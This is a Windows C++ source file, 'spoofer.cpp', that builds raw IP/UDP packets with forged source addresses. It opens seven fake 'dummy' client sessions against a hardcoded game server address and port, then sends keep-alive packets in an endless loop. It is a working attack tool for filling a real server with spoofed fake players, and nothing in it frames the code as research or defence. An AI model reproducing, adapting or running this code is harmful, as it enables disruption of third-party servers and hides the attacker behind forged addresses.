/* Paszczak wrote this v2.0 */

// spoofer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "winsock2.h"
#include "ws2tcpip.h" //IP_HDRINCL is here
#include "conio.h"

#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

#include "spoofer.h"

#include "api.h"



void SendData(const char *pData, int Size, int s)
{
	m_PayloadSize = Size;

	ZeroMemory(m_aMessage, MAX_MESSAGE);

	for (unsigned int i = 0; i < m_PayloadSize; i++)
		m_aMessage[i] = pData[i];

	IP_HDR IP;
	IP.Version = 4;
	IP.IHL = sizeof(IP_HDR) / sizeof(unsigned long);
	IP.DSCP = 0;
	IP.ECN = 1;
	IP.Length = htons(sizeof(IP_HDR) + sizeof(UDP_HDR) + m_PayloadSize);
	IP.ID = 0;
	IP.Flags = 0;
	IP.FragOffset = 0;
	IP.TTL = 128;
	IP.Protocol = IPPROTO_UDP;
	IP.Checksum = 0;
	IP.SourceIP = m_FromIP[s];
	IP.DestIP = m_ToIP;
	IP.Checksum = checksum((USHORT *)&IP, sizeof(IP));

	UDP_HDR UDP;
	UDP.SourcePort = m_FromPort;
	UDP.DestPort = m_ToPort;
	UDP.Length = htons(sizeof(UDP_HDR) + m_PayloadSize);
	UDP.Checksum = 0;

	char *ptr = NULL;

	m_ChecksumUDP = 0;
	ptr = m_aPacket;
	ZeroMemory(m_aPacket, MAX_PACKET);

	memcpy(ptr, &IP.SourceIP, sizeof(IP.SourceIP));
	ptr += sizeof(IP.SourceIP);
	m_ChecksumUDP += sizeof(IP.SourceIP);

	memcpy(ptr, &IP.DestIP, sizeof(IP.DestIP));
	ptr += sizeof(IP.DestIP);
	m_ChecksumUDP += sizeof(IP.DestIP);

	ptr++;
	m_ChecksumUDP++;

	memcpy(ptr, &IP.Protocol, sizeof(IP.Protocol));
	ptr += sizeof(IP.Protocol);
	m_ChecksumUDP += sizeof(IP.Protocol);

	memcpy(ptr, &UDP.Length, sizeof(UDP.Length));
	ptr += sizeof(UDP.Length);
	m_ChecksumUDP += sizeof(UDP.Length);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);
	m_ChecksumUDP += sizeof(UDP);

	for (unsigned int i = 0; i < m_PayloadSize; i++, ptr++)
		*ptr = m_aMessage[i];
	m_ChecksumUDP += m_PayloadSize;

	UDP.Checksum = checksum((USHORT *)m_aPacket, m_ChecksumUDP);

	ZeroMemory(m_aPacket, MAX_PACKET);
	ptr = m_aPacket;

	memcpy(ptr, &IP, sizeof(IP));
	ptr += sizeof(IP);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);

	memcpy(ptr, m_aMessage, m_PayloadSize);

	m_Sin.sin_family = AF_INET;
	m_Sin.sin_port = m_ToPort;
	m_Sin.sin_addr.s_addr = m_ToIP;

	int Bytes = sendto(m_Sock[s], m_aPacket, sizeof(IP) + sizeof(UDP) + m_PayloadSize, 0, (SOCKADDR *)&m_Sin, sizeof(m_Sin));



	/*if(Bytes != SOCKET_ERROR)
	std::cout << Bytes << " sent" << std::endl; */


}

bool Create(SOCKET *pSock)
{
	WSADATA data;
	char aBuf[1024];

	if (WSAStartup(MAKEWORD(2, 2), &data))
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSAStartup() failed: %d\n", GetLastError());
		Output(aBuf);
		return false;
	}

	*pSock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_UDP, NULL, 0, 0);

	if (*pSock == INVALID_SOCKET)
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSASocket() failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	BOOL optvalue = TRUE;

	if (setsockopt(*pSock, IPPROTO_IP, IP_HDRINCL, (char *)&optvalue, sizeof(optvalue)) == SOCKET_ERROR)
	{
		sprintf_s(aBuf, sizeof(aBuf), "setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	sprintf_s(aBuf, sizeof(aBuf), "socket created correctly\n");
	Output(aBuf);

	return true;
}

void Output(char *pBuf)
{
	//FILE *pFile = fopen("Sniffer.txt","a+"); 
	//fprintf(pFile,"%s", pBuf); 
	//fclose(pFile); 
	printf("%s", pBuf);
}

void Close(int s)
{
	closesocket(m_Sock[s]);
	WSACleanup();
	//getchar();
}

USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;

	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);

	return (USHORT)(~cksum);
}


//debug for packet's data
void Debug(unsigned char *buffer, int buffersize)
{
	int i;
	for (i = 0; i < buffersize; i++)
	{
		printf("%02X", buffer[i]);
	}

	printf("\n");
}

void ConnectDummies(int Amount)
{
	AmountofDummies = Amount; // for tick (keep alive)

	int i;
	for(i = 0; i < Amount; i++)
	{
		if (!Create(&m_Sock[i]))
			Close(i);
	}

	//m_FromIP[0] = inet_addr("192.168.100.10");
    m_FromIP[0] = inet_addr("133.37.133.37");
	m_FromIP[1]	= inet_addr("111.111.111.111");
	m_FromIP[2]	= inet_addr("222.222.222.222");
	m_FromIP[3]	= inet_addr("122.122.122.122");
	m_FromIP[4]	= inet_addr("133.133.133.133");
	m_FromIP[5]	= inet_addr("144.144.144.144");
	m_FromIP[6]	= inet_addr("155.155.155.155");
	m_FromIP[7]	= inet_addr("166.166.166.166");

	m_FromPort = htons(1111);

	m_ToIP = inet_addr("92.222.64.188");
	m_ToPort = htons(8707);

	//char message[256];  -- it was for chat ^^
	unsigned char buffer[2048];

	int BufferSize = 0;
	int j = 0;


	for(j = 0; j < Amount; j++)
	{
		Reset();

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackConnect(&buffer[0]);
		SendData((const char*)buffer, BufferSize, j);

		Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackClientInfo(&buffer[0]);
		SendData((const char*)buffer, BufferSize, j);

		Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackReady(&buffer[0]);
		SendData((const char*)buffer, BufferSize, j);

		Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackSendInfo(&buffer[0]);
		SendData((const char*)buffer, BufferSize, j);

		Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackEnterGame(&buffer[0]);
		SendData((const char*)buffer, BufferSize, j);

		Debug(&buffer[0], BufferSize);
	}
	//Close(0);
}

void Tick()
{
	if (time > 500) //once in 500 ms
	{
		time = 0;

		printf("KEEPIN ALIVE ...\n");

		unsigned char buffer[2048];

		int BufferSize = 0;

		for (int i = 0; i < AmountofDummies; i++)
		{
			ZeroMemory(buffer, 2048);
			BufferSize = PackKeepAlive(&buffer[0]);
			SendData((const char*)buffer, BufferSize, i);
		}
	}
	else
		time++;
}

int _tmain(int argc, _TCHAR* argv[])
{

	ConnectDummies(7);

	while (1)
	{
		Tick();
		Sleep(1);
	}

	/*int srcPort = 0, dstPort = 0;
	char srcIP[256];
	char dstIP[256];

	printf("source ip:\n");

	gets_s(srcIP);

	printf("source port:\n");

	scanf_s("%d", &srcPort);

	printf("destination ip:\n");

	gets_s(dstIP);

	printf("destination port:\n");

	scanf_s("%d", &dstPort);*/

	// THIS IS NOT NEEDED HERE! -Meskalin
	/*if (!Create(&m_Sock))
		Close();*/

	/*char aHostname[1024];
	gethostname(aHostname, 1024);
	struct hostent *pHostent;
	pHostent = gethostbyname(aHostname);

	m_ToIP = inet_addr("92.222.22.82");
	m_ToPort = htons(8303);

	m_FromIP = /*inet_addr("1.30.158.56");inet_addr(inet_ntoa(*(struct in_addr *)*pHostent->h_addr_list));
	m_FromPort = htons(1337);*/

	/*m_ToIP = inet_addr("92.222.64.188");
	m_ToPort = htons(8707);

	m_FromIP = inet_addr("192.168.100.10");
	m_FromPort = htons(1111);

	char message[256];
	unsigned char buffer[2048];

	int BufferSize = 0;
	int i = 0;

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackConnect(&buffer[0]);
	SendData((const char*)buffer, BufferSize, i);

	for (i = 0; i < BufferSize; i++)
	{
		printf("%02X", buffer[i]);
	}

	printf("\n");

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackClientInfo(&buffer[0]);
	SendData((const char*)buffer, BufferSize, i);

	for (i = 0; i < BufferSize; i++)
	{
		printf("%02X", buffer[i]);
	}

	printf("\n");

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackReady(&buffer[0]);
	SendData((const char*)buffer, BufferSize, i);

	for (i = 0; i < BufferSize; i++)
	{
		printf("%02X", buffer[i]);
	}

	printf("\n");

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackSendInfo(&buffer[0]);
	SendData((const char*)buffer, BufferSize, i);

	for (i = 0; i < BufferSize; i++)
	{
		printf("%02X", buffer[i]);
	}

	printf("\n");

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackEnterGame(&buffer[0]);
	SendData((const char*)buffer, BufferSize, i);

	for (i = 0; i < BufferSize; i++)
	{
		printf("%02X", buffer[i]);
	}

	printf("\n");

	//start communication
	while (1)
	{
		printf("Enter message: ");
		gets_s(message);

		ZeroMemory(buffer, sizeof(buffer));
		//BufferSize = PackReady(&buffer[0]);
		BufferSize = PackSay(&buffer[0], message, 0);
		//int BufferSize = PackClientInfo(&buffer[0]);

		for (i = 0; i < BufferSize; i++)
		{
			printf("%02X", buffer[i]);
		}

		printf("\n");

		//send the message
		SendData((const char*)buffer, BufferSize, i);
	}

	Close(0);*/

	return 0;
}

